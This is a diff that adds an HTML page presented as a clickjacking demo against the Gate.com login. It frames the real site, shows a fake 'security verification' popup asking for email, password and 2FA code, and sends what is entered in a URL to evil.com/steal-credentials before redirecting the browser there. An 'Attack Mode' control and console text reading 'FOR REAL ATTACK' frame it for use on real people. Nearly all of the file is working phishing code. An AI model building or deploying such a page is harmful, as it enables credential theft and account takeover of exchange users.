@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gate.com - Security Verification Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0e27;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Container that holds the REAL Gate.com website */
+        .gate-container {
+            width: 100%;
+            max-width: 1200px;
+            height: 90vh;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        /* The REAL Gate.com website - FULLY VISIBLE */
+        .gate-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: white;
+        }
+
+        /* ============================================ */
+        /* SMALL FAKE POPUP OVERLAY - VERY SMALL SIZE */
+        /* ============================================ */
+        .fake-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            background: linear-gradient(135deg, #1e2a3a, #0f1724);
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.1);
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+
+        /* Fake popup header */
+        .popup-header {
+            background: linear-gradient(135deg, #ff6b00, #ff0033);
+            padding: 12px 16px;
+            border-radius: 16px 16px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .popup-header h3 {
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .popup-header .close-btn {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            font-size: 14px;
+        }
+
+        /* Fake form body - VERY SMALL */
+        .popup-body {
+            padding: 16px;
+        }
+
+        .warning-text {
+            background: #ff003322;
+            padding: 8px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-size: 11px;
+            color: #ffaa88;
+            text-align: center;
+        }
+
+        .input-row {
+            margin-bottom: 12px;
+        }
+
+        .input-row label {
+            display: block;
+            color: #aaa;
+            font-size: 11px;
+            margin-bottom: 4px;
+        }
+
+        .input-row input {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0a0e1a;
+            border: 1px solid #2a3a44;
+            border-radius: 8px;
+            color: white;
+            font-size: 13px;
+            box-sizing: border-box;
+        }
+
+        .input-row input:focus {
+            outline: none;
+            border-color: #ff6b00;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #ff6b00, #ff0033);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .login-btn:hover {
+            opacity: 0.9;
+        }
+
+        .popup-footer {
+            padding: 12px 16px;
+            background: #0a0e1a;
+            border-radius: 0 0 16px 16px;
+            font-size: 9px;
+            color: #666;
+            text-align: center;
+            border-top: 1px solid #1a2a3a;
+        }
+
+        /* Draggable handle */
+        .drag-handle {
+            cursor: move;
+            user-select: none;
+        }
+
+        /* Status bar */
+        .status-bar {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #1a1a2e;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-family: monospace;
+            z-index: 10001;
+            color: #00ff88;
+        }
+
+        /* Control buttons */
+        .controls {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: #1a1a2e;
+            padding: 6px 12px;
+            border-radius: 20px;
+            z-index: 10001;
+            display: flex;
+            gap: 8px;
+        }
+
+        .controls button {
+            padding: 4px 10px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 10px;
+        }
+
+        .controls button.attack {
+            background: #ff0033;
+        }
+    </style>
+</head>
+<body>
+
+<div class="gate-container">
+    <!-- THE REAL GATE.COM WEBSITE - FULLY VISIBLE -->
+    <iframe class="gate-iframe" id="gateIframe" src="https://www.gate.com/login"></iframe>
+</div>
+
+<!-- SMALL FAKE POPUP OVERLAY -->
+<div class="fake-overlay" id="fakeOverlay">
+    <div class="popup-header drag-handle" id="dragHandle">
+        <h3>⚠️ SECURITY VERIFICATION REQUIRED</h3>
+        <button class="close-btn" id="closePopup">✕</button>
+    </div>
+    <div class="popup-body">
+        <div class="warning-text">
+            🔐 Suspicious login detected. Please re-authenticate to continue.
+        </div>
+        <div class="input-row">
+            <label>📧 Email Address</label>
+            <input type="email" id="fakeEmail" placeholder="your@email.com" autocomplete="off">
+        </div>
+        <div class="input-row">
+            <label>🔒 Password</label>
+            <input type="password" id="fakePassword" placeholder="••••••••" autocomplete="off">
+        </div>
+        <div class="input-row">
+            <label>📱 2FA Code (if enabled)</label>
+            <input type="text" id="fake2fa" placeholder="6-digit code" autocomplete="off">
+        </div>
+        <button class="login-btn" id="attackBtn">
+            🔓 VERIFY & CONTINUE
+        </button>
+    </div>
+    <div class="popup-footer">
+        This is a secure verification process. Your information is protected.
+    </div>
+</div>
+
+<!-- Status -->
+<div class="status-bar" id="statusBar">
+    🔍 Loading Gate.com...
+</div>
+
+<!-- Controls -->
+<div class="controls">
+    <button id="hideOverlayBtn">👻 Hide Overlay (Attack Mode)</button>
+    <button id="showOverlayBtn">👁️ Show Overlay</button>
+</div>
+
+<script>
+    const iframe = document.getElementById('gateIframe');
+    const statusBar = document.getElementById('statusBar');
+    const fakeEmail = document.getElementById('fakeEmail');
+    const fakePassword = document.getElementById('fakePassword');
+    const fake2fa = document.getElementById('fake2fa');
+    const fakeOverlay = document.getElementById('fakeOverlay');
+    let attackExecuted = false;
+    
+    // Check if Gate.com loaded
+    iframe.onload = () => {
+        statusBar.innerHTML = "✅ VULNERABLE: Gate.com login page loaded! X-Frame-Options MISSING";
+        statusBar.style.color = "#00ff88";
+        
+        console.log('%c========================================', 'color: #00ff00; font-weight: bold;');
+        console.log('%c✅ CLICKJACKING VULNERABILITY CONFIRMED!', 'color: #00ff00; font-weight: bold;');
+        console.log('%c✅ https://www.gate.com/login loaded in iframe', 'color: #00ff00;');
+        console.log('%c✅ User can SEE the real Gate.com website', 'color: #00ff00;');
+        console.log('%c❌ X-Frame-Options header is MISSING', 'color: #ff4444;');
+        console.log('%c========================================', 'color: #00ff00; font-weight: bold;');
+    };
+    
+    // Redirect to evil.com with stolen credentials
+    function redirectToEvil() {
+        if (attackExecuted) return;
+        
+        const email = fakeEmail.value.trim();
+        const password = fakePassword.value;
+        const twofa = fake2fa.value;
+        
+        if (!email || !password) {
+            statusBar.innerHTML = "⚠️ Please enter email and password in the popup!";
+            statusBar.style.color = "#ffaa44";
+            return false;
+        }
+        
+        attackExecuted = true;
+        
+        const evilUrl = `https://evil.com/steal-credentials?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&2fa=${encodeURIComponent(twofa)}&site=gate.com&page=login&timestamp=${Date.now()}`;
+        
+        console.log('%c🔴 CLICKJACKING ATTACK EXECUTED!', 'color: #ff4444; font-size: 16px; font-weight: bold;');
+        console.log('%c🔴 Stolen credentials:', 'color: #ff8888;');
+        console.log('   📧 Email: ' + email);
+        console.log('   🔒 Password: ' + password);
+        console.log('   📱 2FA: ' + (twofa || 'none'));
+        console.log('🔴 Redirecting to: ' + evilUrl);
+        
+        statusBar.innerHTML = "🔴 ATTACK EXECUTED! Redirecting to evil.com...";
+        statusBar.style.color = "#ff4444";
+        
+        // Show stolen credentials notification
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff4444;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            z-index: 10002;
+            font-family: monospace;
+            font-size: 11px;
+            box-shadow: 0 4px 12px black;
+        `;
+        notification.innerHTML = `
+            <strong>⚠️ CREDENTIALS STOLEN</strong><br>
+            Email: ${email}<br>
+            Password: ${'•'.repeat(Math.min(password.length, 8))}<br>
+            2FA: ${twofa || 'none'}<br>
+            <small>Redirecting to evil.com...</small>
+        `;
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            window.location.href = evilUrl;
+        }, 2000);
+        
+        return true;
+    }
+    
+    // CLICKJACKING: When user clicks the popup button,
+    // they are actually clicking the real Gate.com login page behind it
+    
+    // Position the popup over the login button on Gate.com
+    // For demo, we just capture the click on the iframe area
+    
+    let clickCaptured = false;
+    
+    // Capture clicks on the iframe (real Gate.com page)
+    iframe.addEventListener('click', (e) => {
+        if (clickCaptured) return;
+        clickCaptured = true;
+        
+        console.log('%c🔴 User clicked the REAL Gate.com login page!', 'color: #ff6600; font-size: 12px;');
+        console.log('%c🔴 User THINKS they clicked the verification button', 'color: #ff6600;');
+        redirectToEvil();
+        
+        setTimeout(() => { clickCaptured = false; }, 1000);
+    });
+    
+    // Also capture the attack button click
+    document.getElementById('attackBtn').addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log('%c🔴 Attack button clicked - triggering clickjacking', 'color: #ffaa00;');
+        redirectToEvil();
+    });
+    
+    // Close popup
+    document.getElementById('closePopup').addEventListener('click', () => {
+        fakeOverlay.style.display = 'none';
+        console.log('Popup closed - user thinks they dismissed it');
+    });
+    
+    // Control buttons
+    document.getElementById('hideOverlayBtn').addEventListener('click', () => {
+        fakeOverlay.style.display = 'none';
+        console.log('%c👻 ATTACK MODE: Popup hidden!', 'color: #ff4444; font-weight: bold;');
+        console.log('%c👻 User only sees real Gate.com - cannot see fake popup!', 'color: #ff4444;');
+        statusBar.innerHTML = "👻 ATTACK MODE: Popup hidden - REAL ATTACK READY";
+    });
+    
+    document.getElementById('showOverlayBtn').addEventListener('click', () => {
+        fakeOverlay.style.display = 'block';
+        console.log('Test mode: Popup visible');
+        statusBar.innerHTML = "🔍 Test mode: Popup visible - showing how attack works";
+    });
+    
+    // Make popup draggable
+    const dragHandle = document.getElementById('dragHandle');
+    let isDragging = false;
+    let offsetX, offsetY;
+    
+    dragHandle.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        offsetX = e.clientX - fakeOverlay.offsetLeft;
+        offsetY = e.clientY - fakeOverlay.offsetTop;
+        fakeOverlay.style.position = 'fixed';
+    });
+    
+    document.addEventListener('mousemove', (e) => {
+        if (isDragging) {
+            fakeOverlay.style.left = (e.clientX - offsetX) + 'px';
+            fakeOverlay.style.top = (e.clientY - offsetY) + 'px';
+            fakeOverlay.style.transform = 'none';
+        }
+    });
+    
+    document.addEventListener('mouseup', () => {
+        isDragging = false;
+    });
+    
+    // Instructions
+    console.log('%c========================================', 'color: #ffaa00; font-weight: bold;');
+    console.log('%cGATE.COM CLICKJACKING DEMO - REAL WEBSITE VISIBLE', 'color: #ffaa00; font-weight: bold;');
+    console.log('%c========================================', 'color: #ffaa00;');
+    console.log('');
+    console.log('%c📌 WHAT YOU SEE:', 'color: #00aaff;');
+    console.log('   - The REAL Gate.com login page (fully visible)');
+    console.log('   - A SMALL fake popup overlay in the middle');
+    console.log('');
+    console.log('%c📌 WHAT THE USER THINKS:', 'color: #00aaff;');
+    console.log('   - They are on the real Gate.com website');
+    console.log('   - A security popup asks them to re-authenticate');
+    console.log('   - They enter their credentials in the popup');
+    console.log('');
+    console.log('%c📌 WHAT ACTUALLY HAPPENS:', 'color: #ff4444;');
+    console.log('   - Credentials are stolen from the popup');
+    console.log('   - Browser redirects to evil.com');
+    console.log('');
+    console.log('%c🔴 FOR REAL ATTACK: Click "Hide Overlay" to hide popup', 'color: #ff4444;');
+    console.log('%c🔴 Then user only sees real Gate.com with NO visible popup', 'color: #ff4444;');
+    
+    fakeEmail.focus();
+</script>
+</body>
+</html>
